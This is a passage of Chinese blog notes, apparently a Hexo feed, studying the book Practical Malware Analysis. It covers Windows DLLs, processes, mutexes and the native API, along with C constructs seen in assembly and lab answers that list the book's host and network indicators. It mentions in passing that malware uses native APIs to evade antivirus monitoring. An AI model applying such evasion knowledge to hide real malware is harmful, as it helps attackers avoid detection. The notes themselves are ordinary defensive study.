Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件<br>恶意代码作者使用DLL的三种方式:</p><h4 id="保存恶意代码"><a href="#保存恶意代码" class="headerlink" title="保存恶意代码"></a>保存恶意代码</h4><p>有时候将恶意代码保存到一个DLL文件比exe文件更加有利。它可以附加到其他进程</p><h4 id="通过使用Windows-DLL"><a href="#通过使用Windows-DLL" class="headerlink" title="通过使用Windows DLL"></a>通过使用Windows DLL</h4><p>可以通过windows调用dll的程序</p><h4 id="通过使用第三方的DLL"><a href="#通过使用第三方的DLL" class="headerlink" title="通过使用第三方的DLL"></a>通过使用第三方的DLL</h4><p>因为是动态链接，所以可以使用第三方的DLL</p><h4 id="DLL的结构"><a href="#DLL的结构" class="headerlink" title="DLL的结构"></a>DLL的结构</h4><p>dll的文件结构几乎和exe文件一模一样，只有一个单一的标志指示这是dll。DLL经常有更多的导出函数，并且导入函数较少。</p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>恶意代码可以通过创建一个新的进程或修改一个已存在的进程，来执行恶意代码。<br>创建一个新的进程需要用到这个函数CreateProcess，下面是代码范例:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"> <span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(  </span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpApplicationName, <span class="comment">// 应用程序名称  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPTSTR lpCommandLine, <span class="comment">// 命令行字符串  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// 进程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// 线程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　BOOL bInheritHandles, <span class="comment">// 是否继承父进程的属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　DWORD dwCreationFlags, <span class="comment">// 创建标志  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPVOID lpEnvironment, <span class="comment">// 指向新的环境块的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpCurrentDirectory, <span class="comment">// 指向当前目录名的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSTARTUPINFO lpStartupInfo, <span class="comment">// 传递给新进程的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// 新进程返回的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>进程是执行代码的容器，线程才是Windows操作系统真正要执行的内容。<br>创建一个新的线程CreateThread</p><h3 id="使用互斥量-mutex-的进程间协作"><a href="#使用互斥量-mutex-的进程间协作" class="headerlink" title="使用互斥量(mutex)的进程间协作"></a>使用互斥量(mutex)的进程间协作</h3><p>互斥量是全局对象，用于协调多个进程和线程。主要用于控制共享资源的访问，并且经常被恶意代码使用(因为它们经常使用硬编码)。因为如果一个互斥量被两个不使用其它方式通讯的进程使用时，它的名字必须是互斥一致的。<br>一个互斥量可以通过CreateMutex函数进行创建，而进程可以通过OpenMutex调用来获取另一个进程中互斥量的句柄。线程通过一个对WaitForSingleObject的调用，获取对互斥量的访问，当一个线程完成对互斥量的使用后，需要使用ReleaseMutex</p><h2 id="内核与用户模式"><a href="#内核与用户模式" class="headerlink" title="内核与用户模式"></a>内核与用户模式</h2><p>Windows使用两种处理器特权级别:内核模式与用户模式。<br>依据处理器上执行的代码的类型，处理器在两个模式之间切换。应用程序在用户模式下执行。核心操作系统组件在内核模式下执行。多个驱动程序在内核模式下执行，但某些驱动程序在用户模式下执行。<br>用户模式：不能直接访问硬件，应用程序的虚拟地址空间除了为专用空间以外。还会受到限制。在用户模式下执行的处理器无法訪问为该操作系统保留的虚拟地址。限制用户模式应用程序的虚拟地址空间可防止应用程序更改而且可能损坏关键的操作系统数据。<br>内核模式: 内核模式下执行的全部代码都共享单个虚拟地址空间。这表示内核模式驱动程序未从其它驱动程序和操作系统自身独立开来。</p><h2 id="原生态API"><a href="#原生态API" class="headerlink" title="原生态API"></a>原生态API</h2><p>原生态API是用来和Windows进行交互的底层API,他们很少被非恶意软件使用，但是在恶意代码作者之间却很受欢迎。调用原生API函数可以绕过普通Windows API。<br>当调用Windows API中的一个函数时，这个函数通常不会直接执行请求的动作，因为大多数重要的数据结构都会被保存在内核中。这时用户程序被给予对用户API(如:DLL)的访问，这些DLL会调用ntdll.dll，这是一个特殊的DLL程序，它管理用户空间与内核的 交互。然后处理器却换到内核模式，并执行内核中的一个函数。这里ntdll函数像内核中的函数一样，使用API和结构体，这些函数组成了原生API。应用程序不建议调用原生API,但是操作系统中没有任何东西来阻止它们这样做。所有直接调用原生API对恶意代码作者来说很有吸引力，因为原生态API允许它们做一些采用别的方式不可能做到的事情，同时有时候很隐蔽(比如:一些反病毒软件是监控一个进程使用的系统调用，这里就可以躲避啦)。</p><h2 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h2><h3 id="这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行"><a href="#这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行" class="headerlink" title="这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行"></a>这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行</h3><p>发现两个函数:<br><img src="https://i.imgur.com/KkNhcak.png" alt=""><br>其中一个是StartServiceCtrlDispatcherA——&gt;在2000/XP等基于NT 的操作系统中，有一个服务管理器，它管理的后台进程被称为 service。在任务管理器中，并且随系统启动而最先运行，随系统关闭而最后停止。</p><h3 id="为什么程序会使用一个互斥量"><a href="#为什么程序会使用一个互斥量" class="headerlink" title="为什么程序会使用一个互斥量"></a>为什么程序会使用一个互斥量</h3><p>用于控制共享资源的访问</p><h3 id="可以用来检测这个程序的基于主机特征是什么？"><a href="#可以用来检测这个程序的基于主机特征是什么？" class="headerlink" title="可以用来检测这个程序的基于主机特征是什么？"></a>可以用来检测这个程序的基于主机特征是什么？</h3><p>使用Malservice与HGL345的互斥量，发现恶意域名:<a href="http://www.malwareanalysisbook.com" target="_blank" rel="external">http://www.malwareanalysisbook.com</a></p><h3 id="检测这个恶意代码基于网络特征是什么？"><a href="#检测这个恶意代码基于网络特征是什么？" class="headerlink" title="检测这个恶意代码基于网络特征是什么？"></a>检测这个恶意代码基于网络特征是什么？</h3><p>发现恶意域名:<a href="http://www.malwareanalysisbook.com。并且调用InternetOpenUrlA网络函数" target="_blank" rel="external">http://www.malwareanalysisbook.com。并且调用InternetOpenUrlA网络函数</a></p><h3 id="这个程序的目的是什么"><a href="#这个程序的目的是什么" class="headerlink" title="这个程序的目的是什么"></a>这个程序的目的是什么</h3><p>开机自启动，并且访问域名<a href="http://www.malwareanalysisbook，同时有WriteFile函数，可以写文件" target="_blank" rel="external">http://www.malwareanalysisbook，同时有WriteFile函数，可以写文件</a></p><h3 id="这个程序什么时候完成执行"><a href="#这个程序什么时候完成执行" class="headerlink" title="这个程序什么时候完成执行"></a>这个程序什么时候完成执行</h3><p>关机即结束</p><h1 id="API实战"><a href="#API实战" class="headerlink" title="API实战"></a>API实战</h1><h2 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h2><p>MessageBox指的是显示一个模态对话框<br>函数定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MessageBox</span><span class="params">(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType)</span></span>;</div><div class="line"></div><div class="line">hWnd：</div><div class="line">此参数代表消息框拥有的窗口。如果为<span class="literal">NULL</span>，则消息框没有拥有窗口。</div><div class="line">lpText：</div><div class="line">消息框的内容。如果使用了Unicode库，则把文本变成：  </div><div class="line">lpCaption：</div><div class="line">消息框的标题。如果使用了Unicode库，则把文本变成</div><div class="line">uType：</div><div class="line">指定一个决定对话框的内容和行为的位标志集。此参数可以为下列标志组中标志的组合。指定下列标志中的一个来显示消息框中的按钮以及图标。</div></pre></td></tr></table></figure></p><p>使用<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MessageBox(<span class="literal">NULL</span>,<span class="string">L"显示的字"</span>,<span class="string">L"标题"</span>,MB_RETRYCANCEL);<span class="comment">//L宏来传递字符串   MB_RETRYCANCEL按钮数量</span></div></pre></td></tr></table></figure></p><h2 id="GetWindowText"><a href="#GetWindowText" class="headerlink" title="GetWindowText"></a>GetWindowText</h2><p>Windows API宏，在WinUser.h中根据是否已定义Unicode被分别定义为GetWindowTextW和GetWindowTextA。该函数将指定窗口的标题条文本（如果存在）拷贝到一个缓存区内。如果指定的窗口是一个控件，则拷贝控件的文本。<br>函数定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">Int <span class="title">GetWindowText</span><span class="params">(HWND hWnd,LPTSTR lpString,Int nMaxCount)</span></span>;</div><div class="line"></div><div class="line"></div><div class="line">GetWindowText(</div><div class="line">  hWnd: HWND;        &#123;窗口句柄&#125;</div><div class="line">  lpString: PChar;   &#123;接收文本的缓冲区的指针&#125;</div><div class="line">  nMaxCount: Integer &#123;指定缓冲区大小, 其中包含<span class="literal">NULL</span>字符; 如果文本超出，会被被截断&#125;</div><div class="line">): Integer;          &#123;返回字符个数, 不包括中断的空字符; 如果标题为空或句柄无效, 则返回零&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;多数恶意代码以Windows平台为目标，并且与操作系统进行紧密交互。对基本Windoows编程概念的深刻理解会帮助你识别出恶意代码在主机上的感染迹象，跟踪恶意代码的执行(因为它们可能使用操作系统来执行代码而不是用一个跳转或调用指令)，并最终分析出恶意代码的目的。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析———识别汇编中的C代码结构</title>
    <link href="http://yoursite.com/2018/04/25/re_14_evil_2/"/>
    <id>http://yoursite.com/2018/04/25/re_14_evil_2/</id>
    <published>2018-04-25T00:49:18.000Z</published>
    <updated>2018-05-15T00:35:14.215Z</updated>
    
    <content type="html"><![CDATA[<p>C语言是最基础的高级编程语言，许多恶意代码都是有C编写的<br><a id="more"></a></p><h1 id="识别汇编中的C代码结构"><a href="#识别汇编中的C代码结构" class="headerlink" title="识别汇编中的C代码结构"></a>识别汇编中的C代码结构</h1><h2 id="全局与局部变量"><a href="#全局与局部变量" class="headerlink" title="全局与局部变量"></a>全局与局部变量</h2><p>全局变量可以被一个程序中的任意函数访问和使用，局部变量只能在它被定义的函数中访问和使用.例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">int x=1, y=3;</div><div class="line">void main()</div><div class="line">&#123;</div><div class="line">x = x + y;</div><div class="line">printf(&quot;Total = %d\n&quot;,x);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>与<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">void main()</div><div class="line">&#123;</div><div class="line">int x = 1, y = 3;</div><div class="line">x = x + y;</div><div class="line">printf(&quot;Total = %d\n&quot;,x);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>汇编结构:<br><img src="https://i.imgur.com/YA5gXPl.png" alt=""><br>全局变量通过内存地址引用，而局部变量通过栈地址引用.</p><h2 id="各种结构体"><a href="#各种结构体" class="headerlink" title="各种结构体"></a>各种结构体</h2><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> x = <span class="number">1</span>, y = <span class="number">3</span>,x1=<span class="number">0</span>,y1=<span class="number">2</span>;</div><div class="line"><span class="keyword">if</span> (x==y) &#123;</div><div class="line"><span class="keyword">if</span>(y1==x1)&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y == x\n and y1==x1\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y == x and y1!=x1\n"</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"><span class="keyword">if</span> (y1==x1) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y1== x1 and x!=y\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"y1!= x1 and  x!=y\n"</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/d7WvAra.png" alt=""><br>视图<br><img src="https://i.imgur.com/Asu0roV.png" alt=""><br>逻辑是一样的，判断后跳转</p><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"><span class="keyword">switch</span> (i) </div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> <span class="number">1</span>: </div><div class="line"><span class="built_in">printf</span>(<span class="string">"i == 1"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> <span class="number">2</span>:</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i == 2"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> <span class="number">3</span>:</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i == 3"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/eMvkfsC.png" alt=""><br>视图<br><img src="https://i.imgur.com/ziZzHE1.png" alt=""></p><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i equals %d\n"</span>,i);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/m5UeIjS.png" alt=""></p><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span>(i&gt;<span class="number">10</span>)&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"i equals %d\n"</span>,i);</div><div class="line">i++;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/FHPnkmN.png" alt=""></p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">int</span> b[<span class="number">5</span>] = &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> a[<span class="number">5</span>];</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</div><div class="line">&#123;</div><div class="line">a[i] = i;</div><div class="line">b[i] = i;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/3YdJPOu.png" alt=""><br>视图</p><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> &#123;</span></div><div class="line"><span class="keyword">int</span> x[<span class="number">5</span>];</div><div class="line"><span class="keyword">char</span> y;</div><div class="line"><span class="keyword">double</span> z;</div><div class="line">&#125;;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> *<span class="title">gms</span>;</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(struct my_struct *q)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line">q-&gt;y = <span class="string">'a'</span>;</div><div class="line">q-&gt;z = <span class="number">15.6</span>;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</div><div class="line">&#123;</div><div class="line">q-&gt;x[i] = i;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">gms = (struct my_struct *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct my_struct));</div><div class="line">test(gms);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/8L4rj5o.png" alt=""></p><h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></div><div class="line"><span class="keyword">int</span> x;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></div><div class="line">&#125;;</div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">pnode</span>;</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">pnode *curr, *head;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line">head = <span class="literal">NULL</span>;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">10</span>;i++)</div><div class="line">&#123;</div><div class="line">curr = (pnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(pnode));</div><div class="line">curr-&gt;x = i;</div><div class="line">curr-&gt;next = head;</div><div class="line">head = curr;</div><div class="line">&#125;</div><div class="line">curr = head;</div><div class="line"><span class="keyword">while</span> (curr)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,curr-&gt;x);</div><div class="line">curr == curr-&gt;next;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/cTZFWiI.png" alt=""></p><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>C语言默认的函数调用方法：所有参数从右到左依次入栈，这些参数由调用者清除，称为手动清栈。</p><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h3><p> 调用约定用于调用 Win32 API 函数。其参数都是从右向左通过堆栈传递的, 被调用方将清理堆栈</p><h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>规定将前两个参数由寄存器ecx和edx来传递(x86)，其余参数还是通过堆栈传递（从右到左）。函数调用结束后由被调用函数清除栈内数据</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="lab06-01"><a href="#lab06-01" class="headerlink" title="lab06-01"></a>lab06-01</h3><p>1、由main函数调用的唯一子过程中发现的主要代码结构是什么?<br>有一个if-else结构体<br>2、位于0x40105f的子过程是什么？<br>一个结构体，输出函数<br>3、这个程序的目的是什么？<br>判断网络连接状态</p><h3 id="lab06-2"><a href="#lab06-2" class="headerlink" title="lab06-2"></a>lab06-2</h3><p>1、main函数调用的第一个子过程执行什么操作？<br>判断网络连接状态<br>2、位于0x40117F的子过程是什么？<br>一个结构体，输出函数<br>3、被main函数调用的第二个子过程做了什么？<br><img src="https://i.imgur.com/gtfKGxY.png" alt=""><br>一个连接网络的函数<br>4、在这个子过程中使用了什么类型的代码结构？<br>使用了if-else和结构体<br>5、在这个子过程中使用了什么类型的代码结构？<br>指定连接这个域名 <a href="http://www.practicalmalwareanalysis.com" target="_blank" rel="external">http://www.practicalmalwareanalysis.com</a><br>6、这个恶意代码的目的是什么？<br>判断是否有网络并且连接这个域名 <a href="http://www.practicalmalwareanalysis.com" target="_blank" rel="external">http://www.practicalmalwareanalysis.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;C语言是最基础的高级编程语言，许多恶意代码都是有C编写的&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析——静态与动态分析基础技术</title>
    <link href="http://yoursite.com/2018/04/20/re_13_evil_1/"/>
    <id>http://yoursite.com/2018/04/20/re_13_evil_1/</id>
    <published>2018-04-20T00:49:18.000Z</published>
    <updated>2018-05-15T00:35:08.792Z</updated>
    
    <content type="html"><![CDATA[<p>啥？你电脑中病毒啦，被勒索啦，那就来好好学习恶意代码分析，讲得很好。留下了没有技术的眼泪<br><a id="more"></a></p><h1 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h1><h2 id="什么是恶意代码分析"><a href="#什么是恶意代码分析" class="headerlink" title="什么是恶意代码分析"></a>什么是恶意代码分析</h2><p>恶意代码也称为恶意软件:任何以某种方式来对用户、计算机或者网络炒成破坏的软件，包括计算机病毒、木马、蠕虫、内核套件、勒索软件、间谍软件；</p><h2 id="各种鸡汤"><a href="#各种鸡汤" class="headerlink" title="各种鸡汤"></a>各种鸡汤</h2><p>不管你是否有恶意代码分析的背景或经验，你都会从本书中受益。若你将要被安全公司炒，那么你马上拿起这本书啃，这将会帮助你保住饭碗。若你还是对恶意软件一无所知，那么你会将开启一闪全新的大门。。鸡汤再多，还是要动手实践，实践是检测能力的唯一标准。</p><h2 id="恶意代码类型"><a href="#恶意代码类型" class="headerlink" title="恶意代码类型"></a>恶意代码类型</h2><p>1、后门: 恶意代码将自身安装到一台计算机来 允许攻击者来访问。后门程序通常让攻击者只需很少认证甚至无需认证，便可连接到 远程计算机上，并可以在本地系统执行命令。<br>2、僵尸网络：与后门类似，也允许攻击者访问系统。但是所有被同一个僵尸网络感染的计算机将会从一台控制命令服务器收到相同的命令<br>3、下载器:这是一类只是用来下载其他恶意代码的恶意代码。下载器通常是在攻击者获得系统的访问时，首先进行安装的。下载程序会下载和安装其他的恶意代码。<br>4、间谍软件:这是一类从受害计算机上收集信息并发送给攻击者的恶意代码。比如:键盘记录器<br>5、启动器: 用来启动其他恶意程序的恶意软件。一般使用一些非传统的技术，以确保其隐蔽性，或者以获取高权限访问系统。<br>6、内核套件: 设计用来隐藏其他恶意代码的恶意软件。通常与其他恶意代码(后门)组合成工具套装。<br>7、勒索软件:通过骚扰、恐吓甚至采用绑架用户文件等方式，使用户数据资产或计算资源无法正常使用，并以此为条件向用户勒索钱财。这类用户数据资产包括文档、邮件、数据库、源代码、图片、压缩文件等多种文件。赎金形式包括真实货币、比特币或其它虚拟货币。<br>8、发送垃圾邮件的恶意代码:这类恶意代码在感染用户计算机之后，便会使用系统与网络资源来发送大量的垃圾邮件。<br>9、蠕虫或计算机病毒:可以自我复制和感染其他计算机的恶意代码。</p><h1 id="静态分析基础技术"><a href="#静态分析基础技术" class="headerlink" title="静态分析基础技术"></a>静态分析基础技术</h1><h2 id="知识技能依赖"><a href="#知识技能依赖" class="headerlink" title="知识技能依赖"></a>知识技能依赖</h2><p><img src="https://i.imgur.com/e3549Sc.png" alt=""><br>要能够对恶意代码进行分析，需要掌握大量的知识，以及较强的代码逆向分析能力，代码调试能力。</p><p>要分析恶意软件执行了哪些行为，首先需要知道恶意软件常见的一些行为，如反弹shell，进程感染，文件隐藏，信息收集等。而要弄清这些行为，恶意软件需要对文件，注册表，进程进行操作，同时恶意软件要对感染的主机下发指令，传输收集到的信息，通常需要建立网络连接。要更准确的分析需要知道使用了哪些WinAPI实现了这些功能。<br><img src="https://i.imgur.com/b6hY9oN.png" alt=""><br>对于初级的分析方法，只要掌握常见的知识，以及一些工具的使用即可快速的掌握。如可以使用工具分析文件的hash值，字符串，函数表，函数库依赖关系。 